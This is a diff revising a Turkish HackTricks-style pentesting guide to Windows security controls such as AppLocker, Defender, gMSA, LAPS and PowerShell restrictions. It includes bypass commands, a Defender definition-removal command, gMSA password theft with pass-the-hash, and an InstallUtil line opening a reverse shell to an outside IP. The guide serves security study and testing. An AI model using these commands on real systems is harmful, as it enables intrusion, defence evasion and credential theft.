@@ -1,18 +1,17 @@
-# Windows Güvenlik Kontrolleri
+# Windows Security Controls
 
 {{#include ../../banners/hacktricks-training.md}}
 
-## AppLocker Politikası
+## AppLocker Policy
 
-Bir uygulama beyaz listesi, bir sistemde bulunmasına ve çalışmasına izin verilen onaylanmış yazılım uygulamaları veya çalıştırılabilir dosyaların listesidir. Amaç, ortamı zararlı malware ve kuruluşun belirli iş ihtiyaçlarıyla uyumlu olmayan onaylanmamış yazılımlardan korumaktır.
+An application whitelist, bir sistemde bulunmasına ve çalıştırılmasına izin verilen onaylı yazılım uygulamalarının veya yürütülebilir dosyaların listesidir. Amaç, ortamı zararlı malware'lerden ve bir kuruluşun özel iş ihtiyaçlarıyla uyumlu olmayan onaysız yazılımlardan korumaktır.
 
-[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) Microsoft'un **uygulama beyaz listeleme çözümüdür** ve sistem yöneticilerine **kullanıcıların hangi uygulamaları ve dosyaları çalıştırabileceği** üzerinde kontrol sağlar.\
-Çalıştırılabilir dosyalar, scriptler, Windows installer dosyaları, DLL'ler, paketlenmiş uygulamalar ve paket uygulama yükleyicileri üzerinde **ayrıntılı kontrol** sağlar.\
-Kuruluşların **cmd.exe ve PowerShell.exe**'i engellemesi ve belirli dizinlere yazma erişimini kısıtlaması yaygındır, **ancak bunların tamamı atlatılabilir**.
+[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker), Microsoft'un **application whitelisting çözümüdür** ve sistem yöneticilerine **kullanıcıların hangi uygulamaları ve dosyaları çalıştırabileceği** üzerinde kontrol sağlar. Yürütülebilir dosyalar, script'ler, Windows installer dosyaları, DLL'ler, paketlenmiş uygulamalar ve paketlenmiş uygulama installer'ları üzerinde **ayrıntılı kontrol** sunar.\
+Kuruluşların **cmd.exe ve PowerShell.exe'yi engellemesi** ve belirli dizinlere yazma erişimini kısıtlaması yaygındır, **ancak bunların tamamı bypass edilebilir**.
 
 ### Kontrol
 
-Hangi dosyaların/uzantıların kara listeye veya beyaz listeye alındığını kontrol edin:
+Hangi dosyaların/uzantıların blacklist/whitelist'e alındığını kontrol edin:
 ```bash
 Get-ApplockerPolicy -Effective -xml
 
@@ -21,60 +20,60 @@ Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
 $a = Get-ApplockerPolicy -effective
 $a.rulecollections
 ```
-Bu kayıt defteri yolu, AppLocker tarafından uygulanan yapılandırmaları ve politikaları içerir; sistemde uygulanan mevcut kural setini incelemek için bir yol sağlar:
+Bu registry path, AppLocker tarafından uygulanan yapılandırmaları ve policy'leri içerir; sistemde zorunlu kılınan mevcut rule set'ini incelemek için bir yol sağlar:
 
 - `HKLM\Software\Policies\Microsoft\Windows\SrpV2`
 
 ### Bypass
 
-- AppLocker Policy'yi bypass etmek için kullanışlı **Writable folders**: Eğer AppLocker `C:\Windows\System32` veya `C:\Windows` içinde herhangi bir şeyin çalıştırılmasına izin veriyorsa, bunu **bypass** etmek için kullanabileceğiniz **writable folders** vardır.
+- AppLocker Policy'yi bypass etmek için kullanışlı **Writable folders**: AppLocker, `C:\Windows\System32` veya `C:\Windows` içinde herhangi bir şeyin çalıştırılmasına izin veriyorsa, bunu **bypass etmek** için kullanabileceğiniz **writable folders** bulunur.
 ```
 C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
 C:\Windows\System32\spool\drivers\color
 C:\Windows\Tasks
 C:\windows\tracing
 ```
-- Genellikle **trusted** [**"LOLBAS's"**](https://lolbas-project.github.io/) ikili dosyalar AppLocker'ı atlatmak için de faydalı olabilir.
-- **Kötü yazılmış kurallar da atlatılabilir**
-- Örneğin, **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**, her yerde **`allowed` adında bir klasör** oluşturabilirsiniz ve izin verilecektir.
-- Organizasyonlar genellikle **`%System32%\WindowsPowerShell\v1.0\powershell.exe` yürütülebilir dosyasını engellemeye** odaklanır, ancak **diğer** [**PowerShell executable locations**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations) gibi `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` veya `PowerShell_ISE.exe` gibi yerleri unuturlar.
-- **DLL enforcement çok nadiren etkinleştirilir** çünkü sisteme ek yük getirebilir ve hiçbir şeyin bozulmayacağından emin olmak için gereken test miktarı fazladır. Bu yüzden **DLL'leri backdoors olarak kullanmak AppLocker'ı atlatmaya yardımcı olur**.
-- ReflectivePick veya SharpPick kullanarak herhangi bir süreçte **Powershell** kodu çalıştırabilir ve AppLocker'ı atlatabilirsiniz. Daha fazla bilgi için bakın: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).
+- Yaygın olarak **güvenilen** [**"LOLBAS's"**](https://lolbas-project.github.io/) ikili dosyaları AppLocker'ı bypass etmek için de kullanılabilir.
+- **Kötü yazılmış kurallar da bypass edilebilir**
+- Örneğin, **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`** için herhangi bir yerde **`allowed` adlı bir klasör** oluşturabilirsiniz ve buna izin verilir.
+- Kuruluşlar ayrıca genellikle **`%System32%\WindowsPowerShell\v1.0\powershell.exe` çalıştırılabilir dosyasını engellemeye** odaklanır, ancak `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` veya `PowerShell_ISE.exe` gibi diğer [**PowerShell çalıştırılabilir dosyası konumlarını**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations) unuturlar.
+- **DLL enforcement**, bir sisteme yükleyebileceği ek yük ve hiçbir şeyin bozulmayacağından emin olmak için gereken test miktarı nedeniyle çok nadiren etkinleştirilir. Bu nedenle **DLL'leri backdoor olarak kullanmak AppLocker'ı bypass etmeye yardımcı olur**.
+- Herhangi bir process içinde **Powershell** kodu çalıştırmak ve AppLocker'ı bypass etmek için [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) veya [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) kullanabilirsiniz. Daha fazla bilgi için şuraya bakın: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[4]](#references)</sup>
 
-## Kimlik Bilgileri Depolama
+## Kimlik Bilgilerinin Depolanması
 
 ### Security Accounts Manager (SAM)
 
-Yerel kimlik bilgileri bu dosyada bulunur, parolalar hashlenmiştir.
+Yerel kimlik bilgileri bu dosyada bulunur; parolalar hash'lenmiştir.
 
 ### Local Security Authority (LSA) - LSASS
 
-Kimlik bilgileri (hashlenmiş) Single Sign-On nedenleriyle bu alt sistemin **belleğinde** saklanır.\
-**LSA** yerel **güvenlik politikasını** (parola politikası, kullanıcı izinleri...), **authentication**, **access tokens**... yönetir.\
-LSA, sağlanan kimlik bilgilerini yerel giriş için **SAM** dosyası içinde **kontrol edecek** ve bir domain kullanıcısını doğrulamak için **domain controller** ile **iletişime geçecektir**.
+**Kimlik bilgileri** (hash'lenmiş şekilde), Single Sign-On nedenleriyle bu subsystem'in **belleğinde** **saklanır**.\
+**LSA**, yerel **güvenlik politikasını** (parola politikası, kullanıcı izinleri...), **authentication**, **access token'ları**... yönetir.\
+LSA, sağlanan kimlik bilgilerini **SAM** dosyasında (yerel login için) **kontrol edecek** ve bir domain kullanıcısını authenticate etmek için **domain controller** ile **iletişim kuracak** bileşendir.
 
-Kimlik bilgileri **LSASS** sürecinin içinde saklanır: Kerberos ticket'ları, NT ve LM hash'leri, kolayca çözülebilen parolalar.
+**Kimlik bilgileri** **LSASS process'i** içinde **saklanır**: Kerberos ticket'ları, NT ve LM hash'leri, kolayca decrypt edilebilen parolalar.
 
 ### LSA secrets
 
-LSA bazı kimlik bilgilerini diske kaydedebilir:
+LSA bazı kimlik bilgilerini diskte saklayabilir:
 
-- Active Directory bilgisayar hesabının parolası (ulaşılamayan domain controller).
-- Windows servis hesaplarının parolaları
-- Zamanlanmış görevler için parolalar
-- Diğer (IIS uygulamalarının parolası...)
+- Active Directory bilgisayar hesabının parolası (erişilemeyen domain controller).
+- Windows servislerinin hesaplarının parolaları
+- Scheduled task'lar için parolalar
+- Diğerleri (IIS uygulamalarının parolası...)
 
 ### NTDS.dit
 
-Active Directory'nin veritabanıdır. Sadece Domain Controller'larda bulunur.
+Active Directory'nin veritabanıdır. Yalnızca Domain Controller'larda bulunur.
 
 ## Defender
 
-[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender) Windows 10 ve Windows 11'de ve Windows Server sürümlerinde bulunan bir Antivirus'tür. `WinPEAS` gibi yaygın pentesting araçlarını **engeller**. Ancak bu korumaları **atlatmanın** yolları vardır.
+[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender), Windows 10 ve Windows 11'de ve Windows Server sürümlerinde bulunan bir Antivirus'tür. **`WinPEAS`** gibi yaygın pentesting araçlarını **engeller**. Ancak bu **korumaları bypass etmenin yolları** vardır.
 
-### Check
+### Kontrol
 
-Defender'ın **durumunu** kontrol etmek için PS cmdlet'i **`Get-MpComputerStatus`** çalıştırabilirsiniz (etkin olup olmadığını öğrenmek için **`RealTimeProtectionEnabled`** değerine bakın):
+**Defender**'ın **durumunu** kontrol etmek için PS cmdlet'i **`Get-MpComputerStatus`** çalıştırabilirsiniz (aktif olup olmadığını öğrenmek için **`RealTimeProtectionEnabled`** değerini kontrol edin):
 
 <pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus
 
@@ -93,7 +92,7 @@ NISEngineVersion                : 0.0.0.0
 PSComputerName                  :
 </code></pre>
 
-Bunu enumerate etmek için ayrıca şunu da çalıştırabilirsiniz:
+Bunu enumerate etmek için şunu da çalıştırabilirsiniz:
 ```bash
 WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
 wmic /namespace:\\root\securitycenter2 path antivirusproduct
@@ -102,103 +101,104 @@ sc query windefend
 #Delete all rules of Defender (useful for machines without internet access)
 "C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
 ```
-## Şifrelenmiş Dosya Sistemi (EFS)
+## Encrypted File System (EFS)
 
-EFS, dosyaları şifreleyerek korur ve bunun için **symmetric key** olarak bilinen **File Encryption Key (FEK)**'i kullanır. Bu anahtar kullanıcıya ait **public key** ile şifrelenir ve şifrelenmiş dosyanın $EFS **alternative data stream**'inde saklanır. Deşifre gerektiğinde, kullanıcının dijital sertifikasının ilgili **private key**'i FEK'i $EFS akışından çözmek için kullanılır. Daha fazla detay için [here](https://en.wikipedia.org/wiki/Encrypting_File_System).
+EFS, dosyaları **File Encryption Key (FEK)** olarak bilinen bir **symmetric key** kullanarak şifreleme yoluyla güvence altına alır. Bu anahtar, kullanıcının **public key**'iyle şifrelenir ve şifrelenmiş dosyanın $EFS **alternative data stream**'i içinde saklanır. Şifre çözme gerektiğinde, kullanıcının dijital sertifikasına karşılık gelen **private key**, $EFS stream'indeki FEK'in şifresini çözmek için kullanılır. Daha fazla bilgiye [buradan](https://en.wikipedia.org/wiki/Encrypting_File_System) ulaşabilirsiniz.
 
-**Kullanıcı başlatması olmadan deşifre senaryoları** şunlardır:
+**Kullanıcı tarafından başlatılmadan gerçekleşen şifre çözme senaryoları** şunları içerir:
 
-- Dosyalar veya klasörler non-EFS bir dosya sistemine, örn. [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table), taşındığında otomatik olarak deşifre edilir.
-- SMB/CIFS protokolü üzerinden ağda gönderilen şifrelenmiş dosyalar iletimden önce deşifre edilir.
+- Dosyalar veya klasörler [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table) gibi EFS olmayan bir file system'e taşındığında otomatik olarak şifreleri çözülür.
+- SMB/CIFS protokolü üzerinden network aracılığıyla gönderilen şifrelenmiş dosyaların, iletimden önce şifreleri çözülür.
 
-Bu şifreleme yöntemi sahibin şifrelenmiş dosyalara **transparent access** ile erişmesini sağlar. Ancak, sadece sahibin şifresini değiştirmek ve oturum açmak deşifreye izin vermez.
+Bu şifreleme yöntemi, sahibinin şifrelenmiş dosyalara **transparent access** sağlamasına olanak tanır. Ancak yalnızca sahibin password'ünü değiştirmek ve oturum açmak, şifre çözmeye izin vermez.
 
-**Temel Noktalar**:
+**Key Takeaways**:
 
-- EFS, kullanıcıya ait public key ile şifrelenmiş simetrik bir FEK kullanır.
-- Deşifre, FEK'e erişmek için kullanıcının private key'ini kullanır.
-- Otomatik deşifreleme belirli koşullarda gerçekleşir; örn. FAT32'ye kopyalama veya ağ üzerinden iletim.
-- Şifrelenmiş dosyalar sahibine ek adımlar olmadan erişilebilir.
+- EFS, kullanıcının public key'iyle şifrelenmiş symmetric bir FEK kullanır.
+- Şifre çözme işlemi, FEK'e erişmek için kullanıcının private key'ini kullanır.
+- FAT32'ye kopyalama veya network üzerinden iletim gibi belirli koşullarda otomatik şifre çözme gerçekleşir.
+- Şifrelenmiş dosyalara, ek adımlar olmadan sahibi tarafından erişilebilir.
 
-### EFS bilgilerini kontrol et
+### EFS info'yu kontrol etme
 
-Bir **kullanıcının** bu **servisi** kullanıp kullanmadığını kontrol etmek için şu yolun var olup olmadığını denetleyin: `C:\users\<username>\appdata\roaming\Microsoft\Protect`
+Bir **user**'ın bu **service**'i **kullanıp kullanmadığını**, şu path'in mevcut olup olmadığını kontrol ederek öğrenin:`C:\users\<username>\appdata\roaming\Microsoft\Protect`
 
-Bir dosyaya **kimin** **eriştiğini** kontrol etmek için cipher /c \<file\> komutunu kullanın. Ayrıca bir klasör içinde `cipher /e` ve `cipher /d` komutlarını kullanarak tüm dosyaları **şifreleyebilir** ve **deşifre edebilirsiniz**.
+Dosyaya **kimlerin** **erişimi** olduğunu cipher /c \<file>\ kullanarak kontrol edin\
+Bir klasör içinde `cipher /e` ve `cipher /d` kullanarak tüm dosyaları **encrypt** ve **decrypt** edebilirsiniz
 
-### EFS dosyalarının deşifre edilmesi
+### EFS dosyalarının şifresini çözme
 
-#### SYSTEM yetkisine sahip olmak
+#### Authority System olarak
 
-Bu yöntem, **kurban kullanıcının** host içinde bir **process** çalıştırıyor olmasını gerektirir. Eğer durum buysa, bir `meterpreter` session'ı kullanarak kullanıcının process token'ını taklit edebilirsiniz (`impersonate_token` from `incognito`). Ya da kullanıcı process'ine `migrate` edebilirsiniz.
+Bu yöntem, **victim user**'ın host içinde bir **process** çalıştırmasını gerektirir. Böyle bir durum söz konusuysa, bir `meterpreter` session kullanarak kullanıcının process'inin token'ını (`incognito` içindeki `impersonate_token`) taklit edebilirsiniz. Alternatif olarak kullanıcının process'ine `migrate` edebilirsiniz.
 
-#### Kullanıcı şifresini bilmek
+#### Kullanıcının password'ünü bilmek
 
 
 {{#ref}}
 https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files
 {{#endref}}
 
-## Grup Yönetilen Servis Hesapları (gMSA)
+## Group Managed Service Accounts (gMSA)
 
-Microsoft, IT altyapılarında servis hesaplarının yönetimini basitleştirmek için **Group Managed Service Accounts (gMSA)**'leri geliştirdi. Genellikle "**Password never expire**" ayarı etkin olan geleneksel servis hesaplarının aksine, gMSA'lar daha güvenli ve yönetilebilir bir çözüm sunar:
+Microsoft, IT infrastructure'larındaki service account'ların yönetimini kolaylaştırmak için **Group Managed Service Accounts (gMSA)** geliştirdi. Genellikle "**Password never expire**" ayarı etkin olan geleneksel service account'ların aksine, gMSA'ler daha güvenli ve yönetilebilir bir çözüm sunar:
 
-- **Otomatik Parola Yönetimi**: gMSA'lar, alan veya bilgisayar politikasına göre otomatik değişen, 240 karakter uzunluğunda karmaşık bir parola kullanır. Bu işlem Microsoft'un Key Distribution Service (KDC) tarafından yönetilir ve manuel parola güncellemeleri ihtiyacını ortadan kaldırır.
-- **Geliştirilmiş Güvenlik**: Bu hesaplar kilitlenmelere karşı bağışıktır ve etkileşimli oturum açma için kullanılamaz, bu da güvenliği artırır.
-- **Çoklu Host Desteği**: gMSA'lar birden fazla host arasında paylaşılabilir, bu da çoklu sunucuda çalışan servisler için idealdir.
-- **Zamanlanmış Görev Desteği**: Yönetilen servis hesaplarının aksine, gMSA'lar zamanlanmış görevlerin çalıştırılmasını destekler.
-- **Basitleştirilmiş SPN Yönetimi**: Bilgisayarın sAMaccount detayları veya DNS adı değiştiğinde sistem otomatik olarak Service Principal Name (SPN)'i günceller, böylece SPN yönetimi basitleşir.
+- **Automatic Password Management**: gMSA'ler, domain veya computer policy'ye göre otomatik olarak değişen, 240 karakterlik karmaşık bir password kullanır. Bu process, Microsoft'un Key Distribution Service'i (KDC) tarafından yürütülür ve manuel password güncellemeleri gereksinimini ortadan kaldırır.
+- **Enhanced Security**: Bu account'lar lockout işlemine karşı bağışıktır ve interactive login için kullanılamaz; bu da güvenliklerini artırır.
+- **Multiple Host Support**: gMSA'ler birden fazla host arasında paylaşılabilir; bu nedenle birden fazla server üzerinde çalışan service'ler için idealdir.
+- **Scheduled Task Capability**: managed service account'ların aksine, gMSA'ler scheduled task çalıştırmayı destekler.
+- **Simplified SPN Management**: Computer'ın sAMaccount ayrıntılarında veya DNS name'inde değişiklik olduğunda system, Service Principal Name'i (SPN) otomatik olarak günceller ve SPN yönetimini kolaylaştırır.
 
-gMSA parolaları LDAP özelliği _**msDS-ManagedPassword**_ içinde saklanır ve Domain Controllers (DC'ler) tarafından her 30 günde bir otomatik olarak sıfırlanır. Bu parola, [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e) olarak bilinen şifrelenmiş bir veri blob'udur ve yalnızca yetkili yöneticiler ve gMSA'ların yüklü olduğu sunucular tarafından alınabilir; bu da güvenli bir ortam sağlar. Bu bilgiye erişmek için LDAPS gibi güvenli bir bağlantı gereklidir veya bağlantı 'Sealing & Secure' ile doğrulanmış olmalıdır.
+gMSA'lerin password'leri LDAP property _**msDS-ManagedPassword**_ içinde saklanır ve Domain Controller'lar (DC'ler) tarafından her 30 günde bir otomatik olarak resetlenir. [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e) olarak bilinen encrypted data blob biçimindeki bu password, yalnızca yetkili administrator'lar ve gMSA'lerin kurulu olduğu server'lar tarafından alınabilir; böylece güvenli bir ortam sağlanır. Bu bilgilere erişmek için LDAPS gibi güvenli bir connection gereklidir veya connection 'Sealing & Secure' ile authenticated olmalıdır.
 
 ![https://cube0x0.github.io/Relaying-for-gMSA/](../../images/asd1.png)
 
-Bu parolayı [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**
+Bu password'ü [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**<sup>[[2]](#references)</sup> ile okuyabilirsiniz.
 ```
 /GMSAPasswordReader --AccountName jkohler
 ```
-[**Find more info in this post**](https://cube0x0.github.io/Relaying-for-gMSA/)
+[**Bu gönderide daha fazla bilgi bulabilirsiniz**](https://cube0x0.github.io/Relaying-for-gMSA/)
 
-Also, check this [web page](https://cube0x0.github.io/Relaying-for-gMSA/) about how to perform a **NTLM relay attack** to **read** the **password** of **gMSA**.
+Ayrıca, bir **NTLM relay attack** gerçekleştirerek **gMSA**'nın **password** değerini nasıl **read** edebileceğinizi anlatan bu [web sayfasına](https://cube0x0.github.io/Relaying-for-gMSA/) göz atın.<sup>[[1]](#references)</sup>
 
-### ACL zincirlemesini suistimal ederek gMSA yönetilen şifresini okumak (GenericAll -> ReadGMSAPassword)
+### gMSA managed password değerini okumak için ACL chaining'den yararlanma (GenericAll -> ReadGMSAPassword)
 
-Birçok ortamda, düşük ayrıcalikli kullanıcılar yanlış yapılandırılmış nesne ACLs'lerini suistimal ederek DC'yi ele geçirmeye gerek kalmadan gMSA sırlarına erişebilirler:
+Birçok ortamda düşük yetkili kullanıcılar, yanlış yapılandırılmış object ACL'lerinden yararlanarak DC compromise olmadan gMSA secrets değerlerine pivot edebilir:<sup>[[3]](#references)</sup>
 
-- Kontrol edebileceğiniz bir grup (örn. GenericAll/GenericWrite aracılığıyla) bir gMSA üzerinde `ReadGMSAPassword` yetkisi ile yetkilendirilir.
-- Kendinizi o gruba ekleyerek, LDAP üzerinden gMSA'nın `msDS-ManagedPassword` blob'unu okuma hakkını devralırsınız ve kullanılabilir NTLM kimlik bilgilerini türetebilirsiniz.
+- Kontrol edebildiğiniz bir group'a (ör. GenericAll/GenericWrite aracılığıyla) bir gMSA üzerinde `ReadGMSAPassword` yetkisi verilmiştir.
+- Kendinizi bu group'a ekleyerek, LDAP üzerinden gMSA'nın `msDS-ManagedPassword` blob değerini read etme ve kullanılabilir NTLM credentials elde etme hakkını devralırsınız.
 
-Tipik iş akışı:
+Tipik workflow:
 
-1) BloodHound ile yolu keşfedin ve foothold principal'lerinizi Owned olarak işaretleyin. Aşağıdaki gibi kenarları arayın:
+1) BloodHound ile path'i discover edin ve foothold principals değerlerinizi Owned olarak işaretleyin. Şu edge'ler gibi bağlantıları arayın:
 - GroupA GenericAll -> GroupB; GroupB ReadGMSAPassword -> gMSA
 
-2) Kontrol ettiğiniz ara gruba kendinizi ekleyin (bloodyAD ile örnek):
+2) Kontrol ettiğiniz intermediate group'a kendinizi ekleyin (bloodyAD ile örnek):
 ```bash
 bloodyAD --host <DC.FQDN> -d <domain> -u <user> -p <pass> add groupMember <GroupWithReadGmsa> <user>
 ```
-3) LDAP üzerinden gMSA yönetilen parolayı okuyun ve NTLM hash'ini türetin. NetExec, `msDS-ManagedPassword`'in çıkarılmasını ve NTLM'ye dönüştürülmesini otomatikleştirir:
+3) gMSA tarafından yönetilen parolayı LDAP üzerinden okuyun ve NTLM hash'ini türetin. NetExec, `msDS-ManagedPassword` çıkarımını ve NTLM'e dönüştürme işlemini otomatikleştirir:
 ```bash
 # Shows PrincipalsAllowedToReadPassword and computes NTLM automatically
 netexec ldap <DC.FQDN> -u <user> -p <pass> --gmsa
 # Account: mgtsvc$  NTLM: edac7f05cded0b410232b7466ec47d6f
 ```
-4) NTLM hash kullanarak gMSA olarak kimlik doğrulayın (plaintext gerekmez). Hesap Remote Management Users içindeyse, WinRM doğrudan çalışacaktır:
+4) NTLM hash'ini kullanarak gMSA olarak kimlik doğrulaması yapın (plaintext gerekmez). Hesap Remote Management Users grubundaysa WinRM doğrudan çalışır:
 ```bash
 # SMB / WinRM as the gMSA using the NT hash
 netexec smb   <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
 netexec winrm <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
 ```
 Notlar:
-- `msDS-ManagedPassword` için LDAP okumaları sealing gerektirir (ör. LDAPS/sign+seal). Araçlar bunu otomatik olarak halleder.
-- gMSAs genellikle WinRM gibi yerel haklara sahiptir; lateral movement'ı planlamak için grup üyeliğini doğrulayın (ör. Remote Management Users).
-- Eğer NTLM'i kendiniz hesaplamak için yalnızca blob'a ihtiyacınız varsa, MSDS-MANAGEDPASSWORD_BLOB yapısına bakın.
+- `msDS-ManagedPassword` için LDAP okumaları sealing gerektirir (ör. LDAPS/sign+seal). Tools bunu otomatik olarak gerçekleştirir.
+- gMSA'lere genellikle WinRM gibi local haklar verilir; lateral movement planlamak için grup üyeliğini (ör. Remote Management Users) doğrulayın.
+- Blob'a yalnızca NTLM'yi kendiniz hesaplamak için ihtiyacınız varsa MSDS-MANAGEDPASSWORD_BLOB structure'a bakın.
 
 
 
 ## LAPS
 
-The **Local Administrator Password Solution (LAPS)**, available for download from [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899), yerel Administrator parolalarının yönetimini sağlar. Bu parolalar **rastgele oluşturulmuş**, benzersiz ve **düzenli olarak değiştirilir**; Active Directory'de merkezi olarak saklanır. Bu parolalara erişim, yetkili kullanıcılara yönelik ACL'lerle kısıtlanmıştır. Yeterli izin verildiğinde yerel admin parolalarını okuma imkânı sağlanır.
+[Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899) üzerinden indirilebilen **Local Administrator Password Solution (LAPS)**, local Administrator password'lerinin yönetilmesini sağlar. **Randomized**, benzersiz ve **düzenli olarak değiştirilen** bu password'ler, Active Directory'de merkezi olarak depolanır. Bu password'lere erişim, ACL'ler aracılığıyla yetkili users ile sınırlandırılır. Yeterli permissions verildiğinde local admin password'lerini okuma olanağı sağlanır.
 
 
 {{#ref}}
@@ -207,9 +207,9 @@ The **Local Administrator Password Solution (LAPS)**, available for download fro
 
 ## PS Constrained Language Mode
 
-PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **PowerShell'i etkin şekilde kullanmak için gereken birçok özelliği kısıtlar**, örneğin COM objects'in engellenmesi, yalnızca onaylı .NET types'a izin verilmesi, XAML-based workflows, PowerShell classes ve daha fazlası.
+PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/), PowerShell'i etkili şekilde kullanmak için gereken birçok **özelliği kısıtlar**; örneğin COM objects'lerini engeller, yalnızca onaylanmış .NET types'larına izin verir, XAML-based workflows, PowerShell classes ve daha fazlasını kısıtlar.
 
-### **Kontrol**
+### **Kontrol Et**
 ```bash
 $ExecutionContext.SessionState.LanguageMode
 #Values could be: FullLanguage or ConstrainedLanguage
@@ -219,8 +219,8 @@ $ExecutionContext.SessionState.LanguageMode
 #Easy bypass
 Powershell -version 2
 ```
-Güncel Windows sürümlerinde bu Bypass çalışmayabilir ama[ **PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM).\
-**Derlemek için gerekebilir:** _**Referans Ekle**_ -> _Gözat_ -> _Gözat_ -> add `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` ve **projeyi .Net4.5 olarak değiştirin**.
+Güncel Windows sürümlerinde bu Bypass çalışmaz; ancak [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM) kullanabilirsiniz.\
+**Derlemek için** _**Add a Reference**_ -> _Browse_ ->_Browse_ -> `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` eklemeniz ve **projeyi .Net4.5 olarak değiştirmeniz** gerekebilir.
 
 #### Doğrudan bypass:
 ```bash
@@ -230,11 +230,11 @@ C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogTo
 ```bash
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
 ```
-[**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) veya [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) kullanarak herhangi bir işlemde **execute Powershell** code çalıştırabilir ve constrained mode'u atlayabilirsiniz. Daha fazla bilgi için bakınız: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).
+[**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) veya [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) kullanarak herhangi bir process içinde **Powershell** kodu **execute** edebilir ve constrained mode'u bypass edebilirsiniz. Daha fazla bilgi için: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[4]](#references)</sup>
 
-## PS Çalıştırma Politikası
+## PS Execution Policy
 
-Varsayılan olarak **restricted.** olarak ayarlanmıştır. Bu politikayı atlatmanın başlıca yolları:
+Varsayılan olarak **restricted** olarak ayarlanmıştır. Bu policy'yi bypass etmenin başlıca yolları:
 ```bash
 1º Just copy and paste inside the interactive PS console
 2º Read en Exec
@@ -254,21 +254,21 @@ Powershell -command "Write-Host 'My voice is my passport, verify me.'"
 9º Use EncodeCommand
 $command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
 ```
-Daha fazlası için [here](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)
+Daha fazlasını [burada](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)<sup>[[5]](#references)</sup> bulabilirsiniz.
 
 ## Security Support Provider Interface (SSPI)
 
-Kullanıcıları kimlik doğrulamak için kullanılabilecek bir API'dir.
+Kullanıcıların kimliğini doğrulamak için kullanılabilen API'dir.
 
-SSPI, iletişim kurmak isteyen iki makine için uygun protokolü belirlemekten sorumludur. Bunun tercih edilen yöntemi Kerberos'tur. SSPI daha sonra hangi kimlik doğrulama protokolünün kullanılacağını müzakere eder; bu kimlik doğrulama protokollerine Security Support Provider (SSP) denir, her Windows makinesinin içinde bir DLL şeklinde bulunurlar ve iletişim kurabilmek için her iki makinenin de aynı SSP'yi desteklemesi gerekir.
